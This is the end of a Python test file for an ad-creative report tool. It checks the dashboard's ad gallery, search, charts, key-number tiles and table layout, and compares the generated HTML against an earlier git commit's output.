        peaks = {"USD %s" % format(round(r["peak_spend"]), ",") for r in rows_of(self.EXAMPLE_BUNDLE, "ad-media") if r["peak_spend"] is not None}
        for probe in self.run_steps(self.EXAMPLE_BUNDLE, ["#first-ads .cr-mult-head"], [{}, {"start": "2026-03-02", "end": "2026-03-03"}]):
            heads = [t for t in probe["#first-ads .cr-mult-head"]["text"].split(" | ") if t.startswith("Spend by day")]
            self.assertTrue(heads)
            for head in heads:
                self.assertIn(head.replace("Spend by day, peak day", ""), peaks)

    def test_an_ad_without_an_image_shows_its_format_in_the_tile_never_a_blank(self):
        with tempfile.TemporaryDirectory() as tmp:
            verdicts = Path(tmp) / "verdicts.json"
            verdicts.write_text(json.dumps(run_json("keep-or-kill", "verdicts.py")))
            bundle = Path(tmp) / "bundle"
            self.assertEqual(report.main([str(FIXTURE), "--verdicts", str(verdicts), "-o", str(Path(tmp) / "r.html"), "--claude-dashboard", str(bundle)]), 0)
            probe = self.run_page(bundle, "ok", ["#first-ads .cr-ad", "#first-ads .cr-ph-format", "#first-ads .cr-ph-note", "#first-ads img", "#first-images"])
        # Each card keeps its format glyph and name; why no image was shown is said once above the cards, not on each.
        self.assertGreater(probe["#first-ads .cr-ad"]["count"], 0)
        self.assertEqual(probe["#first-ads .cr-ph-format"]["count"], probe["#first-ads .cr-ad"]["count"])
        self.assertEqual(probe["#first-ads .cr-ph-note"]["count"], 0)
        self.assertEqual(probe["#first-ads img"]["count"], 0)
        self.assertEqual(probe["#first-images"]["count"], 1)
        self.assertEqual(probe["#first-images"]["text"], "No previews or thumbnails were supplied.")

    def test_the_example_shows_each_ad_image_as_a_data_url(self):
        probe = self.run_page(self.EXAMPLE_BUNDLE, "ok", ["#first-ads .cr-ad", "#first-ads img", "#first-ads .cr-ph"])
        self.assertGreater(probe["#first-ads img"]["count"], 0)
        self.assertEqual(probe["#first-ads img"]["count"], probe["#first-ads .cr-ad"]["count"])
        self.assertEqual(probe["#first-ads .cr-ph"]["count"], 0)

    ADS = {"click": "a[data-page=ads]"}

    def test_the_ads_page_shows_a_page_of_ads_then_the_rest_and_says_how_many(self):
        steps = self.run_steps(self.EXAMPLE_BUNDLE, ["#ad-gallery .cr-ad", "#ads-more", "#ads-count"], [self.ADS, {"click": "#ads-more"}])
        total = len(rows_of(self.EXAMPLE_BUNDLE, "ad-media"))
        self.assertEqual(steps[0]["#ad-gallery .cr-ad"]["count"], 24)
        self.assertEqual(steps[0]["#ads-more"]["text"], "Show %d more" % (total - 24))
        self.assertFalse(steps[0]["#ads-more"]["own_hidden"])
        self.assertEqual(steps[0]["#ads-count"]["text"], "Showing 24 of %d ads." % total)
        self.assertEqual(steps[1]["#ad-gallery .cr-ad"]["count"], total)
        self.assertTrue(steps[1]["#ads-more"]["own_hidden"])
        self.assertEqual(steps[1]["#ads-count"]["text"], "Showing %d of %d ads." % (total, total))

    def test_searching_the_ads_keeps_only_the_ads_whose_name_matches(self):
        labels = [r["label"] for r in rows_of(self.EXAMPLE_BUNDLE, "ad-media")]
        hits = [l for l in labels if "carousel" in l.lower()]
        self.assertTrue(0 < len(hits) < len(labels))
        steps = self.run_steps(self.EXAMPLE_BUNDLE, ["#ad-gallery .cr-ad", "#ads-count"], [self.ADS, {"input": ["#ads-search", "Carousel"]},
                                                                                          {"input": ["#ads-search", "no such ad"]}])
        self.assertEqual(steps[1]["#ad-gallery .cr-ad"]["count"], len(hits))
        self.assertEqual(steps[1]["#ads-count"]["text"], "Showing %d of %d ads matching \u201ccarousel\u201d." % (len(hits), len(hits)))
        self.assertEqual(steps[2]["#ad-gallery .cr-ad"]["count"], 0)
        self.assertEqual(steps[2]["#ads-count"]["text"], "No ad matches this choice.")

    def test_the_scatter_draws_one_dot_per_ranked_ad(self):
        probe = self.run_steps(self.EXAMPLE_BUNDLE, ["#scatter-chart circle.cr-hit", "#scatter-chart > svg", "#scatter-chart .cr-legend svg.cr-swatch-stroke"], [self.ADS])[0]
        self.assertEqual(probe["#scatter-chart > svg"]["count"], 1)
        self.assertEqual(probe["#scatter-chart .cr-legend svg.cr-swatch-stroke"]["count"], 1)
        self.assertEqual(probe["#scatter-chart circle.cr-hit"]["count"], len(rows_of(self.EXAMPLE_BUNDLE, "pareto")))

    def test_each_line_key_is_drawn_with_its_lines_own_dash(self):
        trends = {"click": "a[data-page=trends]"}
        sel = ['#fatigue-chart path[stroke-dasharray="7 4"]', '#fatigue-chart path[stroke-dasharray="1.5 4"]',
               '#fatigue-chart .cr-legend line[stroke-dasharray="7 4"]', '#fatigue-chart .cr-legend line[stroke-dasharray="1.5 4"]',
               '#fatigue-chart .cr-legend span.cr-dash']
        probe = self.run_steps(self.EXAMPLE_BUNDLE, sel, [trends])[0]
        for chart, legend in ((sel[0], sel[2]), (sel[1], sel[3])):
            self.assertEqual(probe[chart]["count"], 1, chart)
            self.assertEqual(probe[legend]["count"], 1, legend)
        self.assertEqual(probe[sel[4]]["count"], 0)

    def test_the_fatigue_note_counts_the_days_its_top_edge_markers_sit_on(self):
        probe = self.run_steps(self.EXAMPLE_BUNDLE, ["#fatigue-clipped"], [{"click": "a[data-page=trends]"}])[0]
        found = re.search(r"(\d+) ad-days? above .* marked ▲ at the top edge on (\d+) days?, where each line runs along the edge\.", probe["#fatigue-clipped"]["text"])
        self.assertIsNotNone(found, probe["#fatigue-clipped"]["text"])
        self.assertLessEqual(int(found.group(2)), int(found.group(1)))

    def test_the_rolling_average_key_is_dashed_like_its_line(self):
        probe = self.run_page(self.EXAMPLE_BUNDLE, "ok", ['#time-chart .cr-legend line[stroke-dasharray="5 4"]', '#time-chart > svg path[stroke-dasharray="5 4"]'])
        self.assertEqual(probe['#time-chart .cr-legend line[stroke-dasharray="5 4"]']["count"], 1)
        self.assertEqual(probe['#time-chart > svg path[stroke-dasharray="5 4"]']["count"], 1)

    def test_the_totals_check_is_a_scope_fact_and_the_badge_shows_only_when_totals_fall_short(self):
        probe = self.run_page(self.EXAMPLE_BUNDLE, "ok", ["#facts dd[data-where='fact=Totals']", ".cr-completeness"])
        self.assertEqual(probe["#facts dd[data-where='fact=Totals']"]["text"], "not checked against the account's own totals")
        self.assertTrue(probe[".cr-completeness"]["own_hidden"])

    def test_do_these_first_says_when_it_shows_only_some_of_the_ads_to_act_on(self):
        acting = [r for r in rows_of(self.EXAMPLE_BUNDLE, "verdicts") if r["verdict_class"] in ("pause", "iterate", "check", "scale")]
        self.assertGreater(len(acting), 5)
        probe = self.run_page(self.EXAMPLE_BUNDLE, "ok", ["#first-ads .cr-ad", "#first-more"])
        self.assertEqual(probe["#first-ads .cr-ad"]["count"], 5)
        self.assertEqual(probe["#first-more"]["text"], "Showing 5 of the %d ads to act on; the Ads tab lists them all." % len(acting))

    def test_every_table_cell_carries_its_column_name_for_the_narrow_layout(self):
        probe = self.run_steps(self.EXAMPLE_BUNDLE, ["#verdict-table thead th", "#verdict-table tbody tr:first-child td",
                                                     "#verdict-table tbody td:not([data-label])"], [self.ADS, {"click": "#ads-view button[data-view=table]"}])[1]
        heads = probe["#verdict-table thead th"]["text"].split(" | ")
        self.assertEqual(probe["#verdict-table tbody tr:first-child td"]["count"], len(heads))
        self.assertEqual(probe["#verdict-table tbody td:not([data-label])"]["count"], 0)

    def test_a_gallery_card_without_an_image_shows_its_format_and_the_page_says_why_once(self):
        with tempfile.TemporaryDirectory() as tmp:
            verdicts = Path(tmp) / "verdicts.json"
            verdicts.write_text(json.dumps(run_json("keep-or-kill", "verdicts.py")))
            bundle = Path(tmp) / "bundle"
            self.assertEqual(report.main([str(FIXTURE), "--verdicts", str(verdicts), "-o", str(Path(tmp) / "r.html"), "--claude-dashboard", str(bundle)]), 0)
            probe, detail = self.run_steps(bundle, ["#ad-gallery .cr-ad", "#ad-gallery .cr-ph-format", "#ad-gallery .cr-ph-note", "#ad-gallery img", "#images-note",
                                                    "#ad-media-box .cr-ph-note"], [self.ADS, {"ad": rows_of(bundle, "ad-media")[0]["ad_id"]}])
        self.assertEqual(probe["#ad-gallery .cr-ad"]["count"], 24)
        self.assertEqual(probe["#ad-gallery .cr-ph-format"]["count"], 24)
        self.assertEqual(probe["#ad-gallery .cr-ph-note"]["count"], 0)
        self.assertEqual(probe["#ad-gallery img"]["count"], 0)
        self.assertEqual(probe["#images-note"]["text"], "No previews or thumbnails were supplied.")
        # The ad's own page still says in full why it has no image.
        self.assertEqual(detail["#ad-media-box .cr-ph-note"]["text"], "no preview or thumbnail folder was passed")


    def test_tabs_that_always_read_the_whole_window_say_so_where_the_date_range_sits(self):
        pareto, overview = self.run_steps(self.EXAMPLE_BUNDLE, ["#range", "#range-off"], [{"click": "a[data-page=pareto]"}, {"click": "a[data-page=overview]"}])
        self.assertTrue(pareto["#range"]["own_hidden"])
        self.assertFalse(pareto["#range-off"]["own_hidden"])
        self.assertEqual(pareto["#range-off"]["text"], "This tab always reads the whole window. The date range applies to Overview, Ads and Trends.")
        self.assertFalse(overview["#range"]["own_hidden"])
        self.assertTrue(overview["#range-off"]["own_hidden"])

    def test_key_numbers_with_no_value_fold_into_one_line_under_the_tiles(self):
        probe = self.run_page(self.EXAMPLE_BUNDLE, "ok", [".cr-kpi[data-metric=reach]", ".cr-kpi[data-metric=frequency]", ".cr-kpi[data-metric=spend]", "#kpis-na li"])
        self.assertTrue(probe[".cr-kpi[data-metric=reach]"]["own_hidden"])
        self.assertTrue(probe[".cr-kpi[data-metric=frequency]"]["own_hidden"])
        self.assertFalse(probe[".cr-kpi[data-metric=spend]"]["own_hidden"])
        self.assertEqual(probe["#kpis-na li"]["count"], 1)
        self.assertEqual(probe["#kpis-na li"]["text"], "Reach, Frequency: needs an account-level reach and frequency for this window")


class PageToolsRequiredTest(unittest.TestCase):
    def test_required_page_tests_fail_rather_than_skip_when_the_tools_are_missing(self):
        env = dict(os.environ, CR_REQUIRE_PAGE_TESTS="1", CR_JSDOM="", CR_D3="")
        done = subprocess.run([sys.executable, "-m", "unittest", "tests.test_claude_dashboard.PageInADomTest.test_the_example_shows_each_ad_image_as_a_data_url"],
                              cwd=str(ROOT), env=env, capture_output=True, text=True)
        self.assertNotEqual(done.returncode, 0)
        self.assertIn("CR_REQUIRE_PAGE_TESTS=1 but the page tools are missing", done.stderr)
        env.pop("CR_REQUIRE_PAGE_TESTS")
        done = subprocess.run([sys.executable, "-m", "unittest", "tests.test_claude_dashboard.PageInADomTest.test_the_example_shows_each_ad_image_as_a_data_url"],
                              cwd=str(ROOT), env=env, capture_output=True, text=True)
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertIn("skipped", done.stderr)


PARENT = "9d21f51"  # main as this feature branched: the report scripts before any Claude dashboard code


class ParentHtmlTest(unittest.TestCase):
    """Without the flag the report is the one the scripts wrote before this feature, except for the changes listed in ALLOWED (wrong shared
    sentences, fixed in both outputs) and, when rows carry blank purchase counts, the daily series."""

    @staticmethod
    def allowed(html, path):
        """The parent's HTML with each deliberate sentence change applied: the head's ad count names the ads with spend it is out of, and the
        click step says people see the ad (an image ad is not watched), and the purchase-value coverage line and each field's coverage note name the ads with spend they count."""
        total = len(panels.pareto_cut(panels.Ctx(rows=cm.load_rows(str(path)), currency="USD"))["ranked"])
        html = re.sub(r"Purchase value was recorded on (\d+) of (\d+) ads;", r"Purchase value was recorded on \1 of the \2 ads with spend;", html)
        html = re.sub(r"recorded on (\d+) of (\d+) ads; the rest had none", lambda m: "recorded on %s of the %s ads with spend; the rest had none" % (m.group(1), total), html)
        html = re.sub(r"(\d+) ads \((\d+)% of ads\) drive", lambda m: "%s ads (%s%% of the %s ads with spend) drive" % (m.group(1), m.group(2), total), html)
        return html.replace("people watch but do not click", "people see the ad but do not click").replace(
            "People watch but do not click", "People see the ad but do not click")

    SNIPPET = ("import sys, json; sys.path.insert(0, sys.argv[1]); import report, creative_metrics as cm; "
               "grade, verdicts, mix = (json.load(open(p)) for p in sys.argv[3:6]); "
               "sys.stdout.write(report.build_html(rows=cm.load_rows(sys.argv[2]), grade=grade, verdicts=verdicts, mix=mix, "
               "profile=open(sys.argv[6]).read(), currency='USD', generated='2026-01-02'))")

    def test_the_html_is_the_parent_commits_html_for_the_same_inputs(self):
        if subprocess.run(["git", "cat-file", "-e", PARENT + "^{commit}"], cwd=ROOT, capture_output=True).returncode:
            self.skipTest("commit %s is not in this checkout" % PARENT)
        with tempfile.TemporaryDirectory() as tmp:
            archive = subprocess.run(["git", "archive", PARENT, "skills/creative-report", "skills/creative-context", "shared"], cwd=ROOT, capture_output=True)
            self.assertEqual(archive.returncode, 0, archive.stderr)
            subprocess.run(["tar", "-x", "-C", tmp], input=archive.stdout, check=True)
            inputs = []
            for name, (skill, script) in (("grade", ("creative-grader", "grade.py")), ("verdicts", ("keep-or-kill", "verdicts.py")),
                                          ("mix", ("creative-mix", "mix.py"))):
                path = Path(tmp) / ("%s.json" % name)
                path.write_text(json.dumps(run_json(skill, script)))
                inputs.append(str(path))
            made = {}
            for label, scripts in (("parent", Path(tmp) / "skills" / "creative-report" / "scripts"), ("now", SCRIPT)):
                done = subprocess.run([sys.executable, "-I", "-c", self.SNIPPET, str(scripts), str(FIXTURE)] + inputs + [str(PROFILE)],
                                      capture_output=True, text=True)
                self.assertEqual(done.returncode, 0, done.stderr)
                made[label] = done.stdout
            self.assertGreater(len(made["parent"]), 10000)
            self.assertNotEqual(made["parent"], made["now"])
            self.assertEqual(self.allowed(made["parent"], FIXTURE), made["now"])

    def test_blank_purchase_counts_change_only_the_daily_series_and_each_day_cpa_carries_all_its_spend(self):
        """The one deliberate change from the parent: a day's rate is over all its rows, so a row with spend and a blank purchase count keeps
        its spend in that day's CPA, as in the key number. With such rows only the key numbers' sparklines and the over-time chart change."""
        if subprocess.run(["git", "cat-file", "-e", PARENT + "^{commit}"], cwd=ROOT, capture_output=True).returncode:
            self.skipTest("commit %s is not in this checkout" % PARENT)
        with tempfile.TemporaryDirectory() as tmp:
            archive = subprocess.run(["git", "archive", PARENT, "skills/creative-report", "skills/creative-context", "shared"], cwd=ROOT, capture_output=True)
            self.assertEqual(archive.returncode, 0, archive.stderr)
            subprocess.run(["tar", "-x", "-C", tmp], input=archive.stdout, check=True)
            with open(FIXTURE, newline="") as handle:
                reader = csv.DictReader(handle)
                fields, rows = reader.fieldnames, list(reader)
            for n, row in enumerate(rows):
                if n % 7 == 0:
                    row.update({"Purchases": "", "Purchases conversion value": ""})
            blanked = Path(tmp) / "blanked.csv"
            with open(blanked, "w", newline="") as handle:
                writer = csv.DictWriter(handle, fieldnames=fields)
                writer.writeheader()
                writer.writerows(rows)
            inputs = []
            for name, (skill, script) in (("grade", ("creative-grader", "grade.py")), ("verdicts", ("keep-or-kill", "verdicts.py")),
                                          ("mix", ("creative-mix", "mix.py"))):
                path = Path(tmp) / ("%s.json" % name)
                path.write_text(json.dumps(run_json(skill, script)))
                inputs.append(str(path))
            made = {}
            for label, scripts in (("parent", Path(tmp) / "skills" / "creative-report" / "scripts"), ("now", SCRIPT)):
                done = subprocess.run([sys.executable, "-I", "-c", self.SNIPPET, str(scripts), str(blanked)] + inputs + [str(PROFILE)],
                                      capture_output=True, text=True)
                self.assertEqual(done.returncode, 0, done.stderr)
                made[label] = done.stdout if label == "now" else self.allowed(done.stdout, blanked)
            panel = re.compile(r'<section class="card panel" id="(panel-[\w-]+)"')
            parts = {label: dict(zip(panel.findall(html), panel.split(html)[2::2])) for label, html in made.items()}
            self.assertEqual(sorted(parts["parent"]), sorted(parts["now"]))
            changed = sorted(k for k in parts["now"] if parts["now"][k] != parts["parent"][k])
            self.assertEqual(changed, ["panel-kpis", "panel-time"])
            self.assertEqual(panel.split(made["parent"])[0], panel.split(made["now"])[0])
            cal = panels.calendar(cm.load_rows(str(blanked)))
            checked = 0
            for (day, day_rows), cpa in zip(cal, panels.day_values(cal, "cpa")):
                if cpa is not None:
                    spend = sum(r.get("spend") or 0 for r in day_rows)
                    bought = sum(r.get("conversions") or 0 for r in day_rows)
                    self.assertAlmostEqual(cpa * bought, spend, places=6, msg=day)
                    checked += 1
            self.assertGreater(checked, 20)


class DocTest(unittest.TestCase):
    def test_the_reference_table_names_every_dataset_and_column_in_the_schema(self):
        doc = (ROOT / "skills" / "creative-report" / "references" / "claude-dashboard.md").read_text()
        for dataset_id, spec in dashboard.load_schema()["$defs"].items():
            row = next((line for line in doc.splitlines() if line.startswith("| `%s` |" % dataset_id)), "")
            self.assertTrue(row, dataset_id)
            for column in spec["items"]["properties"]:
                self.assertIn("`%s`" % column, row, (dataset_id, column))


class CommittedExampleTest(unittest.TestCase):
    def test_the_committed_example_bundle_passes_its_check(self):
        self.assertEqual(dashboard.check_bundle(str(EXAMPLE / "claude-dashboard")), [])

    def test_the_committed_example_page_files_are_the_shipped_ones(self):
        for name in dashboard.PAGE_FILES:
            self.assertEqual((EXAMPLE / "claude-dashboard" / "files" / name).read_text(), dashboard.page_text(name), name)


if __name__ == "__main__":
    unittest.main()
